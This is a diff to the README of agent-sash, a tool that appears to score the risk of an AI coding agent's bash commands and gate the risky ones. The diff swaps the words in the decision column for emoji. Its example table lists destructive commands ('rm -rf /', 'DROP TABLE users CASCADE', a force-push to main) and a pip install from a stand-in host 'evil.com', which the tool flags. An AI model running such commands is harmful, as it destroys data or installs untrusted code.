@@ -10,18 +10,18 @@ Claude Code's allowlists work for simple cases (`git status`, `ls`) but break do
 
 agent-sash runs a small model locally that scores each bash command's risk from 0 to 1. Safe commands flow through automatically. Risky ones still prompt you.
 
-| Command | Score | Decision |
+| Command | Score | |
 |---|---|---|
-| `python3 -c "print(42)"` | 0.0 | allowed |
-| `python3 -c "import os; os.system('rm -rf /')"` | 1.0 | prompts |
-| `sed -i s/foo/bar/g config.yaml` | 0.3 | allowed |
-| `sed -i s/foo/bar/g /etc/nginx/nginx.conf` | 0.7 | prompts |
-| `git push origin feature-branch` | 0.4 | allowed |
-| `git push --force origin main` | 0.9 | prompts |
-| `psql -c "SELECT count(*) FROM users"` | 0.0 | allowed |
-| `psql -c "DROP TABLE users CASCADE"` | 0.8 | prompts |
-| `pip install requests` | 0.2 | allowed |
-| `pip install requests --index-url http://evil.com/simple` | 0.6 | prompts |
+| `python3 -c "print(42)"` | 0.0 | ✅ |
+| `python3 -c "import os; os.system('rm -rf /')"` | 1.0 | ❌ |
+| `sed -i s/foo/bar/g config.yaml` | 0.3 | ✅ |
+| `sed -i s/foo/bar/g /etc/nginx/nginx.conf` | 0.7 | ❌ |
+| `git push origin feature-branch` | 0.4 | ✅ |
+| `git push --force origin main` | 0.9 | ❌ |
+| `psql -c "SELECT count(*) FROM users"` | 0.0 | ✅ |
+| `psql -c "DROP TABLE users CASCADE"` | 0.8 | ❌ |
+| `pip install requests` | 0.2 | ✅ |
+| `pip install requests --index-url http://evil.com/simple` | 0.6 | ❌ |
 
 ## Quick start
 
